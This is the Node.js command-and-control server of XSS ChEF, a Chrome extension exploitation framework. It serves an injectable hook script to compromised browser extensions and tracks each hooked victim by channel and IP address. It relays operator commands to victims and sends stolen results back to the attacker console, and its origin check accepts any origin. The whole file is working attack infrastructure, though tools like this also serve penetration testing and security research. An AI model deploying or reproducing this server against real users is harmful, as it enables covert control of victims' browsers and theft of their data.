#!/usr/bin/env node
/*
    XSS ChEF - Chrome Extension Exploitation framework
    Copyright (C) 2012  Krzysztof Kotowicz - http://blog.kotowicz.net

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
var WebSocketServer = require('websocket').server;
var http = require('http');
var fs = require('fs');
var url = require('url');
var static = require('node-static');

var fileserver = new(static.Server)('.');

//var https = require('https');
//var privateKey = fs.readFileSync('privatekey.pem').toString();
//var certificate = fs.readFileSync('certificate.pem').toString();
//var options = {key: privateKey, cert: certificate};

var hookFile = fs.readFileSync('xsschef.js').toString();

var hookHeaders = {
    'Content-Type': 'text/javascript',
    'Expires': 'Sat, 26 Jul 1997 05:00:00 GMT',
    'Last-Modified': 'Sat, 26 Jul 2100 05:00:00 GMT',
    'Cache-Control': 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
    'Pragma':'no-cache'
}

var prepareHook = function(req) {
    var channel = 'c'+Math.floor(Math.random()*1000000);
    var ws_url = 'ws://'+req.headers.host + '/';
    
    var debug = (req.url.indexOf('dbg') !== false);
    
    var modified = hookFile.replace(/__URL__/g, ws_url)
                    .replace(/__CHANNEL__/g, channel)
                    .replace(/__CMD_CHANNEL__/g, channel + '-cmd')
                    .replace(/__DEBUG__/g, debug ? '1' : '');
    return modified;
}

var readSnippets = function() {
    var snippets = [];
    var base = './snippets/';

    var subdirs = fs.readdirSync(base);
    
    subdirs = subdirs.filter(function(file) { 
        return fs.statSync(base + file).isDirectory();
    });
    
    subdirs.forEach(function(subdir) {
        var files = fs.readdirSync(base + subdir);
        files
            .filter(function(file) { return file.substr(-3) == '.js'; })
            .forEach(function(file) { 
                snippets.push({
                    type: subdir, 
                    name: file.substr(0,file.length-3),
                    contents: fs.readFileSync(base + subdir + '/' + file, 'utf-8')
                });
            });
    });
    
    return snippets;
};

function htmlEscape(text) {
   return text.replace(/&/g,'&amp;').
     replace(/</g,'&lt;').
     replace(/"/g,'&quot;').
     replace(/'/g,'&#039;');
}

var getSnippetsXML = function() {
    var snippets = readSnippets();
    
    var xml = '<?xml version="1.0" encoding="utf-8"?>\n<snippets>\n';
    snippets.forEach(function(snippet) {
        xml += '<snippet type="' + htmlEscape(snippet.type)
               + '" name="' + htmlEscape(snippet.name) + '">'
               + htmlEscape(snippet.contents)
               + "</snippet>\n";
    })
    return xml + "</snippets>";
}

var server = http.createServer(function(request, response) {
    console.log((new Date()) + ' Received request for ' + request.url);
    if (request.url.indexOf('/hook') === 0) { // hook
        response.writeHead(200, hookHeaders);
        response.end(prepareHook(request));
        return;
    }
    
    if (request.url == '/list') { // list hooks - request from console
        var hooks = [];
        connections.forEach(function(c) {
            if (c.isHook) 
                hooks.push({ch: c.channel, ip: c.remoteAddress, lastActive: c.lastActive});
        });
        response.writeHead(200, {'content-type' : 'application/json'});
        response.end(JSON.stringify(hooks));
        return;
    }

    if (request.url == '/snippets.xml' || request.url == '/snippets.xml.php') { // list snippets - request from console
        response.writeHead(200, {'content-type' : 'text/xml'});
        response.end(getSnippetsXML());
        return;
    }

    if (request.url == '/' || request.url == '/console.html') {
    	response.statusCode = 302;
        response.setHeader('Location', '/console.html?ws_host=' + request.headers.host);
        response.end();
        return;
    }
    
    fileserver.serve(request, response);
});

var commandStorage = {}
var resultStorage = {};
var connections = [];
var args = process.argv.splice(2);
var port = args[0];
if (!port) {
    port = 8080;
}
console.log("XSS ChEF server");
console.log("by Krzysztof Kotowicz - kkotowicz at gmail dot com");
console.log("");
console.log("Usage: node server.js [port=8080]");
console.log("Communication is logged to stderr, use node server.js [port] 2>log.txt");

// todo: list interfaces IPs

server.listen(port, function() {
    console.log((new Date()) + ' ChEF server is listening on <all-interfaces> port ' + port);
    console.log((new Date()) + ' Console URL: http://127.0.0.1:' + port + '/');
    console.log((new Date()) + ' Hook URL:    http://127.0.0.1:' + port + '/hook');
});

wsServer = new WebSocketServer({
    httpServer: server,
    // You should not use autoAcceptConnections for production
    // applications, as it defeats all standard cross-origin protection
    // facilities built into the protocol and the browser.  You should
    // *always* verify the connection's origin and decide whether or not
    // to accept it.
    autoAcceptConnections: false,
    maxReceivedFrameSize: 1024*1024*10, // 10 MB max
    maxReceivedMessageSize: 1024*1024*10
    //disableNagleAlgorithm: false
});

function originIsAllowed(origin) {
  // put logic here to detect whether the specified origin is allowed.
  return true;
}

function push(channel, flagName, container) {
    var sent = false;
    connections.forEach(function(c) {
        if (sent) { 
            return;
        }
        if (c[flagName] && c.channel == channel) {
           var toSend = container[channel];
           if (toSend) {
                delete container[channel];
                c.sendUTF(JSON.stringify(toSend));
                sent = true;
           }
           
        }
    }); 
}

function pushToc2c(channel) {
    return push(channel, 'isC2C', resultStorage);
}

function pushToHook(channel) {
    return push(channel, 'isHook', commandStorage);
}

wsServer.on('request', function(request) {
    if (!originIsAllowed(request.origin) || request.requestedProtocols.indexOf('chef') == -1) {
      // Make sure we only accept requests from an allowed origin
      request.reject();
      console.log((new Date()) + ' Connection from origin ' + request.origin + ' rejected.');
      return;
    }

    var connection = request.accept('chef', request.origin);
    if (connection) {
        connections.push(connection);
    }
    
    console.log((new Date()) + ' WebSocket connection accepted.');
    connection.on('message', function(message) {

        function logHookResponse(channel, payloads) {
            var payload;
            // payloads is array
            for (var i = 0; i < payloads.length; i++) {
                payload = payloads[i];

                if (!payload.type)
                    return;
                
                switch (payload.type) {
                    default:
                        logPayload(channel, "R", JSON.stringify(payload));
                    break;
                }
            }
        }
        
        function logPayload(channel, type, data) {
            console.error(new Date() + "\t" + channel + "\t" + type + "\t" + data);
        }
        
        function logHookCommand(channel, payload) {
            logPayload(channel, "C", JSON.stringify(payload));
        }

        if (message.type !== 'utf8') {
            console.log("Non utf8 format, dropping");
            return;
        }
        
        var payload;
        
        try {
            payload = JSON.parse(message.utf8Data);
            connection.lastActive = new Date();
            switch (payload.cmd) {
                case 'hello-c2c':
                    connection.isHook = false;
                    connection.isC2C = true;
                break;
                case 'set-channel':
                    if (!connection.isC2C) {
                        throw "Only c2c can set-channel"
                    }
                    connection.channel = payload.ch;
                    pushToc2c(connection.channel);
                break;
                case 'hello-hook':
                    connection.isHook = true;
                    connection.isC2C = false;
                    connection.channel = payload.ch;
                    console.log('New hook ' + connection.channel + ' from ' + connection.remoteAddress);
                    pushToHook(connection.channel); // send pending messages
                    connections.forEach(function(c) {
                        if (c.isC2C) {
                            c.sendUTF(JSON.stringify([[{type:'server_msg', result: 'New hook: '+ payload.ch + ' - ' + connection.remoteAddress}]]));
                        }
                    });
                    
                break;
                case 'command': // from c&c to hook
                    if (!connection.isC2C) {
                       throw "Not authorized to send commands";
                    }
                    if (!connection.channel) {
                        throw "No channel set in connection (command)";
                    }
                    if (!commandStorage[connection.channel]) {
                        commandStorage[connection.channel] = [];
                    }
                    logHookCommand(connection.channel, payload.p);
                    commandStorage[connection.channel].push(payload.p);
                    pushToHook(connection.channel);
                break;
                case 'post': // from hook back to c&c 
                    if (!connection.channel) {
                        throw "No channel set in connection (post)";
                    }
                    
                    if (!resultStorage[connection.channel]) {
                        resultStorage[connection.channel] = [];
                    }
                    logHookResponse(connection.channel, payload.p);
                    resultStorage[connection.channel].push(payload.p);
                    pushToc2c(connection.channel);
                break;
                case 'delete':
                    if (connection.isC2C) {
                        resultStorage = {}
                        commandStorage = {}
                    }
                break;
                case 'list':
                    console.log('list');
                    if (connection.isC2C) {
                        var hooks = [];
                        connections.forEach(function(c) {
                            if (c.isHook) 
                                hooks.push({ch: c.channel, ip: c.remoteAddress, lastActive: c.lastActive});
                        });
                        connection.sendUTF(JSON.stringify([[{type:'list', result: hooks}]]));
                    }
                break;
                default:
                    throw 'Unknown command ' + payload.cmd;
            }
        } catch (e) {
            console.log(e);
            return;
        } 
    });

    connection.on('close', function(reasonCode, description) {
        console.log((new Date()) + ' Peer ' + connection.remoteAddress + ' disconnected - ' + reasonCode + ' ' + description);

        var index = connections.indexOf(connection);
        if (index !== -1) {
            // remove the connection from the pool
            connections.splice(index, 1);
        }
        connections.forEach(function(c) {
            if (c.isC2C) {
                c.sendUTF(JSON.stringify([[{type:'server_msg', result: 'Hook '+ connection.channel + ' - ' + connection.remoteAddress + ' disconnected.'}]]));
            }
        });
    });
});
